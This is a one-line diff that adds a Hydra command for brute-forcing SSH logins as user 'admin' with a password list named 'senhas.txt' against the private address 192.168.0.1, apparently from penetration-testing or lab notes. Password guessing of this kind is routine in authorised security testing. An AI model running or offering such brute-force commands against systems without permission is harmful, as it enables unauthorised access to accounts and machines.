@@ -1,0 +1,2 @@
+hydra -l admin -P senhas.txt ssh://192.168.0.1
+
